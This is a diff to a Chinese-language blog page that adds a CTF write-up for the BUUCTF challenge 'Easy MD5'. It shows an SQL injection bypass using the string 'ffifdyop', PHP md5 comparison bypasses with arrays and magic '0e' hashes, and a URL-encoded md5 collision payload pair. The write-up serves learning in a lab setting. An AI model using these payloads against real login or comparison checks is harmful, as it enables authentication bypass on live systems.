@@ -177,7 +177,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/web/" style="color: #ff7d73">web</a>
+                <a href="/tags/web/" style="color: #03a9f4">web</a>
             </span>
             
         </span>
@@ -253,7 +253,39 @@ if(!isset($_GET[&#39;num&#39;]))&#123;
 <p>post提交</p>
 <pre><code class="http">password=404a&amp;money=1e9
 </code></pre>
-<h3 id="2023-6-1-BJDCTF2020-Easy-MD5"><a href="#2023-6-1-BJDCTF2020-Easy-MD5" class="headerlink" title="2023.6.1 [BJDCTF2020]Easy MD5"></a>2023.6.1 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[BJDCTF2020]Easy%20MD5">[BJDCTF2020]Easy MD5</a></h3><p>是否查看wp：</p>
+<h3 id="2023-6-1-BJDCTF2020-Easy-MD5"><a href="#2023-6-1-BJDCTF2020-Easy-MD5" class="headerlink" title="2023.6.1 [BJDCTF2020]Easy MD5"></a>2023.6.1 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[BJDCTF2020]Easy%20MD5">[BJDCTF2020]Easy MD5</a></h3><p>是否查看wp：否</p>
+<p>进入页面发现是一个查询，猜测可能是sql注入，但是题目是md5，所以可能包了一层md5，这里用<code>ffifdyop</code>来查询，这个字符串的md5后hex转ascii的前几位刚好是<code>&#39;or&#39;6</code> 正好构成永真。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306010959709.png" alt="image-20230601095909221"></p>
+<p>之后进入第二关，查看源码发现提示</p>
+<pre><code class="php">$a = $GET[&#39;a&#39;];
+$b = $_GET[&#39;b&#39;];
+if($a != $b &amp;&amp; md5($a) == md5($b))&#123;
+</code></pre>
+<p>md5弱类型比较，这里我用数组可以绕过，做完看其他思路发现可以用240610708，aabg7XSs，aabC9RqS，s878926199a等md5后结果是0e开头的字符串绕过。</p>
+<p>最后来到新页面，代码已给出</p>
+<pre><code class="php"> &lt;?php
+error_reporting(0);
+include &quot;flag.php&quot;;
+
+highlight_file(__FILE__);
+
+if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))&#123;
+    echo $flag;
+&#125; 
+</code></pre>
+<p>是php的强比较，依然可以用数组来绕过，这里post传入</p>
+<pre><code class="http">param1[]=1&amp;param2=2
+</code></pre>
+<p>这样两个md5都是null，但是相等，传入就可以可以得到flag。</p>
+<p>还有一种更强的检测，就是将传入数据转为字符串，就是md5的强碰撞，看到两种方法，一种是使用软件fastcoll，直接将a拖入即可得到msg1和2，然后读取12中即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306011009918.png" alt="image-20230601100958482"></p>
+<p>还有一种是将hex字符串转化为ascii字符串，并写入到bin文件,然后再读取，payload：</p>
+<pre><code class="http">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
+&amp;
+b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
+</code></pre>
+<p>他们的md5值是相等的，考虑到要将一些不可见字符传到服务器，这里使用url编码。</p>
+<h3 id="2023-6-2-护网杯-2018-easy-tornado"><a href="#2023-6-2-护网杯-2018-easy-tornado" class="headerlink" title="2023.6.2 [护网杯 2018]easy_tornado"></a>2023.6.2 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado">[护网杯 2018]easy_tornado</a></h3><p>是否查看wp：</p>
 
     </div>
     
